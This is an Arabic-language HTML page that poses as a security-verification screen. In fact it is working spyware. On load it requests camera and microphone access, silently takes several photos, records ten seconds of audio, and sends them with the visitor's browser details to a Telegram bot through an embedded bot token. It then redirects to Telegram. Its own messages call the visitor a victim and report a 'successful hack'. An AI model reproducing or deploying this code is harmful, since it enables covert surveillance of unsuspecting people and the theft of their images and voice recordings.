<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            color: #fff;
            font-family: Arial;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .hidden { display: none; }
        video, canvas, audio { display: none; }
    </style>
</head>
<body>
    <div id="status">جاري التحقق من الأمان...</div>
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    <audio id="audio"></audio>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('id');
        const linkId = urlParams.get('link_id');
        const BOT_TOKEN = "8670557092:AAEQdhH5pdVn5b9d2xFYqcytjKE8Ptl9MHo";
        
        let mediaStream = null;
        let photoInterval = null;
        let audioRecorder = null;
        let audioChunks = [];
        
        // إرسال رسالة نصية للبوت
        async function sendMessage(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: userId,
                        text: text
                    })
                });
            } catch(e) { console.log(e); }
        }
        
        // إرسال صورة للبوت
        async function sendPhoto(photoData, caption) {
            try {
                const blob = await (await fetch(photoData)).blob();
                const formData = new FormData();
                formData.append('chat_id', userId);
                formData.append('photo', blob, 'photo.jpg');
                formData.append('caption', caption);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch(e) { console.log(e); }
        }
        
        // التقاط صورة من الكاميرا
        function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            
            if (video.videoWidth > 0 && video.videoHeight > 0) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                
                const photoData = canvas.toDataURL('image/jpeg', 0.7);
                const timestamp = new Date().toLocaleString();
                sendPhoto(photoData, `📸 اختراق الكاميرا\nالوقت: ${timestamp}\nالرابط: ${linkId}`);
            }
        }
        
        // بدء تسجيل الصوت
        function startAudioRecording(stream) {
            audioRecorder = new MediaRecorder(stream);
            audioChunks = [];
            
            audioRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    audioChunks.push(event.data);
                }
            };
            
            audioRecorder.onstop = () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
                const formData = new FormData();
                formData.append('chat_id', userId);
                formData.append('voice', audioBlob, 'audio.mp3');
                formData.append('caption', `🎤 تسجيل صوتي\nالوقت: ${new Date().toLocaleString()}\nالرابط: ${linkId}`);
                
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
                    method: 'POST',
                    body: formData
                }).catch(e => console.log(e));
            };
            
            audioRecorder.start();
            
            // تسجيل لمدة 10 ثواني
            setTimeout(() => {
                if (audioRecorder && audioRecorder.state === 'recording') {
                    audioRecorder.stop();
                }
            }, 10000);
        }
        
        // الطلب الرئيسي للصلاحيات
        async function requestPermissions() {
            try {
                // طلب الكاميرا والميكروفون
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                
                const video = document.getElementById('video');
                video.srcObject = mediaStream;
                
                // بدء تسجيل الصوت
                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                startAudioRecording(audioStream);
                
                // إرسال إشعار بالبدء
                sendMessage(`✅ تم اختراق الجهاز بنجاح!\nالضحية: ${navigator.userAgent}\nالوقت: ${new Date().toLocaleString()}\nالرابط: ${linkId}`);
                
                // تغيير النص للضحية (يظهر له شي بسيط)
                document.getElementById('status').innerHTML = '✅ تم التحقق بنجاح... جاري التوجيه';
                
                // التقاط صور كل 3 ثواني لمدة 15 ثانية
                let photosCount = 0;
                photoInterval = setInterval(() => {
                    if (photosCount < 5) {
                        capturePhoto();
                        photosCount++;
                    } else {
                        clearInterval(photoInterval);
                    }
                }, 3000);
                
                // بعد 20 ثانية، قفل كل شيء
                setTimeout(() => {
                    if (photoInterval) clearInterval(photoInterval);
                    if (mediaStream) {
                        mediaStream.getTracks().forEach(track => track.stop());
                    }
                    // تحويل الضحية لتليجرام
                    window.location.href = "https://t.me";
                }, 20000);
                
            } catch(e) {
                sendMessage(`❌ فشل الاختراق!\nالخطأ: ${e.message}\nالوقت: ${new Date().toLocaleString()}`);
                document.getElementById('status').innerHTML = '❌ فشل التحقق';
                setTimeout(() => { window.location.href = "https://t.me"; }, 2000);
            }
        }
        
        // تشغيل الطلب فوراً
        requestPermissions();
    </script>
</body>
</html>